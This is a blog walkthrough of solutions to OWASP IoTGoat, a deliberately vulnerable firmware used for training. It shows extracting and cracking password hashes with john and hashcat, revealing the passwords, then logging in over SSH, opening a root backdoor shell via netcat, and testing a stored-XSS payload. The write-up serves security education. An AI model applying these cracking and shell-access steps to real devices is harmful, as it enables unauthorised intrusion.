+++ 
title = "OWASP IoTGoat Solutions " 
date = "2022-04-26" 
author = "Joan Calabrés"  
description = "Solutions to OWASP IoTGoat: A vulnerable IoT insecure firmware with the OWASP top 10 IoT vulnerabilities." 
+++

*The [IoTGoat](https://github.com/OWASP/IoTGoat) Project is a deliberately insecure firmware based on OpenWrt and maintained by OWASP as a platform to educate software developers and security professionals with testing commonly found vulnerabilities in IoT devices.*

During my training on IoT security, I have found this OWASP vulnerable machine that tries to simulate a vulnerable IoT device introducing the **OWASP top 10 IoT vulnerabilities**. In this post, I will show you my solutions to this challenge. This challenge provides different ways to get started hacking. In my case, I've downloaded the precompiled firmware for static analysis and also downloaded the IoTGoat-x86.vdi for dynamic web testing using VirtualBox.

## Weak, Guessable, or Hardcoded Passwords

The first thing I've done is to download the firmware and extract it using binwalk.  

```bash
binwalk -ev IoTGoat-x86.img
```

The firmware was extracted correctly, as it's not encrypted, we can get into the squash filesystem named **sqashfs-root** and browser for the Linux password files. I've inspected the **/etc/shadw** and **/etc/passwd** files using the cat utility.

```bash
calabres@test:~/Downloads/IOTGoat$ cat _IoTGoat-x86.img-0.extracted/squashfs-root/etc/passwd
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
iotgoatuser:x:1000:1000::/root:/bin/ash
```

The entries found in this file are the users of the system. The parameter **x** found in **root** and **iotgoatuser** entries inside the **/etc/passwd** indicates that these users can be used for login. 

```bash
calabres@test:~/Downloads/IOTGoat$ cat _IoTGoat-x86.img-0.extracted/squashfs-root/etc/shadow
root:$1$Jl7H1VOG$Wgw2F/C.nLNTC.4pwDa4H1:18145:0:99999:7:::
daemon:*:0:0:99999:7:::
ftp:*:0:0:99999:7:::
network:*:0:0:99999:7:::
nobody:*:0:0:99999:7:::
dnsmasq:x:0:0:99999:7:::
dnsmasq:x:0:0:99999:7:::
iotgoatuser:$1$79bz0K8z$Ii6Q/if83F1QodGmkb4Ah.:18145:0:99999:7:::
```

The parameter **\$1** found in the **root** entry and **iotgoatuser** entry indicates that the password hash is made with the **md5** hash algorithm.  The parameters **\$Jl7H1VOG**, **\$79bz0K8z** are the salts and **Wgw2F/C.nLNTC.4pwDa4H1**, **Ii6Q/if83F1QodGmkb4Ah.** the hashed passwords.

### Cracking the iotgoatuser password

On the Internet, I've found that the **Mirai Botnet** was using a [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Malware/mirai-botnet.txt) with the common default IoT devices passwords in order to bruteforce root user passwords.

Used the Mirai botnet wordlist with **john**, a utility for password cracking:

```bash
calabres@test:~/Downloads/IOTGoat$ john shadow.txt --wordlist=mirai-botnet.txt 
Loaded 2 password hashes with 2 different salts (md5crypt [MD5 32/64 X2])
Press 'q' or Ctrl-C to abort, almost any other key for status
7ujMko0vizxv     (iotgoatuser)
1g 0:00:00:00 100% 50.00g/s 2950p/s 5050c/s 5050C/s fucker
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The **john** password cracker used the password salts of the **root** user and **iotgoatuser** in order to calculate hashes with the different passwords inside the worlists.

Finally, after a while... one of the passwords of the wordlist has matched with the salted hash of the **iotgoatuser**. The password is **7ujMko0vizxv**. 

### Cracking the root password 

The dictionary used for cracking the passwords was not enough for the **root** password, so I've downloaded a tool named [princeprocessor](https://github.com/hashcat/princeprocessor) for generating passwords with different words and used the [rockyou](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwjDzqSQzfz2AhV157sIHRAQCOcQFnoECBEQAQ&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd) famous dictionary with the word addition of **iotgoat**. 

```bash
calabres@test:~/Downloads/princeprocessor/src$ ./pp64.bin "rockyou.txt" --pw-min 8 --pw-max 24 > candidates.txt 
```

When the *candidates.txt* was generated, I've prepared a hash file for hashcat (I had some problems with john):

```bash
calabres@test:~/Downloads/IOTGoat$ cat crack1.hash 
$1$79bz0K8z$Ii6Q/if83F1QodGmkb4Ah.
```

I've used this hash file against the generated wordlist in order to find the root password.

```bash
calabres@test:~/Downloads/princeprocessor/src$ sudo hashcat --force -m 500 -a 0 -o password.txt --remove ../../../Tools/IOTGoat/crack1.hash candidates.txt 
```

The password of the root user is:

```bash
iotgoathardcodedpassword
```



## Insecure Network Services	

### Scaning the TCP ports

First of all, I did an nmap in order to discover the different **TCP ports** opened. The **-p-** option tells nmap to scan all the available ports. The **-sT** option tells nmap to scan tcp ports. The following ports were discovered:

```bash
calabres@test:~/Downloads/IOTGoat$ nmap -p- -sT 192.168.11.143
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-28 14:25 CET
Nmap scan report for 192.168.11.143
Host is up (0.00069s latency).
Not shown: 65526 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
53/tcp    open     domain
80/tcp    open     http
443/tcp   open     https
3914/tcp  filtered listcrt-port-2
5515/tcp  open     unknown
40556/tcp filtered unknown
59582/tcp filtered unknown
65534/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 2625.87 seconds
```

#### SSH (port 22)
    
The SSH service is open, we can try the credentials found in step 1 **(iotgoatuser:7ujMko0vizxv)**.

    ```bash
    calabres@test:~/Downloads/IOTGoat$ ssh iotgoatuser@192.168.11.143
    The authenticity of host '192.168.11.143 (192.168.11.143)' can't be established.
    RSA key fingerprint is SHA256:A6/0om/6ogpvqQ0mfbJH6gh1QMAy0v0nHiitQ0EnHpI.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '192.168.11.143' (RSA) to the list of known hosts.
    iotgoatuser@192.168.11.143's password: 


    BusyBox v1.28.4 () built-in shell (ash)

                                                            .--,\\\__         
    ██████╗ ██╗    ██╗ █████╗ ███████╗██████╗                  `-.    a`-.__    
    ██╔═══██╗██║    ██║██╔══██╗██╔════╝██╔══██╗                   |         ')   
    ██║   ██║██║ █╗ ██║███████║███████╗██████╔╝                  / \ _.-'-,`;    
    ██║   ██║██║███╗██║██╔══██║╚════██║██╔═══╝                  /     |   { /    
    ╚██████╔╝╚███╔███╔╝██║  ██║███████║██║                      /     |   { /    
    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝            ..-"``~"-'      ;    )     
                                            ╦┌─┐╔╦╗╔═╗┌─┐┌─┐┌┬┐   ;'    `     
                                            ║│ │ ║ ║ ╦│ │├─┤ │   ;'    `      
                                            ╩└─┘ ╩ ╚═╝└─┘┴ ┴ ┴  ;'    `       
    ------------------------------------------------------------ ;'             
    GitHub: https://github.com/OWASP/IoTGoat                                                
    ------------------------------------------------------------   
    iotgoatuser@IoTGoat:~$ 
    ```

    Login suceed! We can login as **iotgoatuser**! 
    
#### dnsmasq (port 53) 

The port **53** is usually bind with DNS services. In this case the TCP analysis of the port **53** returned the service being used: **dnsmasq 2.73**. I've found on the Internet that this service has multiple critical vulnerabilities related with **DNS poisoning** and **DoS attacks**.

    ```bash
    sudo nmap -sR -p 53 192.168.11.143
    [sudo] password for calabres: 
    WARNING: -sR is now an alias for -sV and activates version detection as well as RPC scan.
    Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-28 16:11 CET
    Nmap scan report for 192.168.11.143
    Host is up (0.00025s latency).

    PORT   STATE SERVICE VERSION
    53/tcp open  domain  dnsmasq 2.73
    MAC Address: 08:00:27:3D:9A:A0 (Oracle VirtualBox virtual NIC)

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 6.45 seconds
    ```    

#### backdoor (port 5515)

There are also other ports detected during the nmap scan. Let's try to connect these ports using netcat. The port **5515** was able to perform a tcp connection, furthermore, this port is a backdoor that serves a root shell.

    ```bash
    calabres@test:~/Downloads/IOTGoat$ netcat 192.168.11.143 5515
    [***]Successfully Connected to IoTGoat's Backdoor[***]
    ls
    bin
    boot
    dev
    dnsmasq_setup.sh
    etc
    lib
    mnt
    overlay
    proc
    rom
    root
    sbin
    sys
    tmp
    usr
    var
    www
    id
    uid=0(root) gid=0(root)
    ```

Trying to figure out, how the backdoor is being served, I inspected the **init.d** folder. This folder has a file inside named **shellback** that points to a binary named shellback **(/usr/bin/shellback)**, this binary serves the backdoor that is loaded in every boot of the **IoTGoat** system.

#### telnetd (port 65534)

Following the same procedure, I used netcat to connect to the last unknown port and found it's asking for credentials.

    ```bash
    calabres@test:~/Downloads/IOTGoat$ netcat 192.168.11.143 65534
    ��������
    IoTGoat login: user-
    user-
    Password: dawdaw

    Login incorrect
    IoTGoat login: ^C
    ```

Used nmap to identify the service, **telnetd** is running; during the inspection of the firmware I've found the binary of the daemon telnetd. Since the telnet protocol is in clear text is not a good idea to use this service.

    ```bash
    calabres@test:~/Downloads/IOTGoat/_IoTGoat-x86.img-0.extracted$ sudo nmap -sR -p 65534 192.168.11.143
    WARNING: -sR is now an alias for -sV and activates version detection as well as RPC scan.
    Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-28 15:54 CET
    Nmap scan report for 192.168.11.143
    Host is up (0.00022s latency).

    PORT      STATE SERVICE VERSION
    65534/tcp open  telnet  BusyBox telnetd
    MAC Address: 08:00:27:3D:9A:A0 (Oracle VirtualBox virtual NIC)
    Service Info: Host: IoTGoat

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds
    ```

## Insecure Ecosystem Interfaces

Inside the **model/view/controller** folders of **luci** (Lua based web framework) used for the Web portal, I found a script that sets up different page entries, this script is **usr/lib/lua/luci/controller/iotgoat/iotgoat.lua**. One entry is  **cmdinject**.  

```bash
calabres@test:~/Downloads/IOTGoat/_IoTGoat-x86.img-0.extracted/squashfs-root/usr/lib/lua/luci/controller/iotgoat$ cat iotgoat.lua 
module("luci.controller.iotgoat.iotgoat", package.seeall)
local http = require("luci.http")
function index()
    entry({"admin", "iotgoat"}, firstchild(), "IoTGoat", 60).dependent=false
    entry({"admin", "iotgoat", "cmdinject"}, template("iotgoat/cmd"), "", 1)
    entry({"admin", "iotgoat", "cam"}, template("iotgoat/camera"), "Camera", 2)
    entry({"admin", "iotgoat", "door"}, template("iotgoat/door"), "Doorlock", 3)
    entry({"admin", "iotgoat", "webcmd"}, call("webcmd"))
end
```

Afterwards, I used **find** to locate the cmdinject file:

```bash
calabres@test:~/Downloads/IOTGoat/_IoTGoat-x86.img-0.extracted/squashfs-root$ find . -iname cmd*
./usr/lib/lua/luci/view/iotgoat/cmd.htm
```

 Browsing to the hidden entry, the hidden resource provides a root shell through the web browser:

```bash
calabres@test:~/Downloads/IOTGoat/_IoTGoat-x86.img-0.extracted/squashfs-root/usr/lib/lua/luci/view/iotgoat$ cat cmd.htm 
<%+header%>
<h2><a name="content">Secret Developer Diagnostics Page</a></h2>
```

In addition, to the hidden entry, I tried to find web vulnerabilities. While browsing the web application I found multiple text inputs and I tried to perform **XSS attacks**. In the following parts of the application I was able to perform persistent **XSS attacks**:

* https://192.168.11.143/cgi-bin/luci/admin/network/firewall/rules
* https://192.168.11.143/cgi-bin/luci/admin/network/firewall/forwards
 
I tested this vulnerabilities using the next Javascript code:

```javascript
<script>alert("test");</script>
```

## Lack of Secure Update Mechanism

The **OpenWRT** firmware can be updated or new packages can be installed. During this step, I tried to find different CVE's affecting the security of the update mechanism. During my search, I've found multiple critical vulnerabilities that are affecting **OpenWRT**.

Found multiple critical CVE's affecting OpenWRT . 

* CVE-2019-19945 (Heap Overflow)
* CVE-2020-7248 (Buffer Overflow)
* CVE-2020-8597 (Buffer Overflow)
* **CVE-2020-28951 (Malicious packages names):** libuci in OpenWrt before 18.06.9 and 19.x before 19.07.5 may encounter a use after free when using malicious package names. This is related to uci_parse_package in file.c and uci_strdup in util.c. 

The last one is affecting the update mechanism as a provided malicious name can cause an after free vulnerability that later on can be exploited in order to load arbitrary code into memory. Also, the backup mechanism does not checks the integrity. 



## Insecure Data Transfer and Storage	

Found a database in the filesystem named **/home/calabres/Downloads/IOTGoat/sensordata.db**. I used **SQLite Browser** in order to open the database and found personal information (names, emails and birthdates) that are not encrypted:

| Username          | Email                  | Birthdate |
|-------------------|------------------------|-----------|
| johnsmith         | johnsmith@gmail.com    | 1311977   |
| jillsmith         | jillsmith@gmail.com    | 4141979   |
| walter            | waltergary@yopmail.com | 32821969  |
| WilliamRonald     | billronald@yopmail.com | 11141989  |
| Test              | TstUser@aol.com        | 12121990  |
| Sgt               | sgtmajor@us.gov        | 10171956  |

## Lack of Device Management 	

During the usage of the web application, I found different pages about logs. Only kernel logs are enabled, but OpenWRT logs are not enabled. 

## Insecure Default Settings 

I configured the **ZAP Proxy** and used **ZAP** for automatic vulnerability discovery. **ZAP** discovered that the application is not using **Content-Security-Policy or X-Frame-Options headers**. Furthermore, the application is only using **csrf tokens** in some requests.

## Conclusions

This vulnerable machine is not intended to be the common penetration testing machine that one needs to obtain root privileges; root privileges are easy to obtain and by different ways. Instead, it includes multiple critical vulnerabilities and shows to the security analyst the different vulnerabilities that can be present on a **IoT device**. Some of these vulnerabilities are very common or easy to discover. As the software included in this machine seems to be focused to be vulnerable, one can explore more advanced vulnerabilities and try to explote them. In my case, I just made a light walk with the top **10 OWASP IoT vulnerabilities** and reported the most interesting ones. Hope you enjoyed!

